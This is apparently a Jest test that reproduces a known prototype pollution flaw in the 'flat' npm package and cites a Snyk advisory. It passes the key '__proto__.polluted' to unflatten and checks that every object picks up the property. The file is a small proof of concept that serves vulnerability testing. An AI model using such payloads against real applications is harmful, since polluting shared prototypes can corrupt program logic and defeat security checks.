//https://snyk.io/vuln/SNYK-JS-FLAT-596927
test("prototype pollution in flat", () => {
  var unflatten = require("flat").unflatten;

  expect({}.polluted).toBe(undefined);

  unflatten({
    "__proto__.polluted": "yes",
  });

  expect({}.polluted).toBe("yes");
});
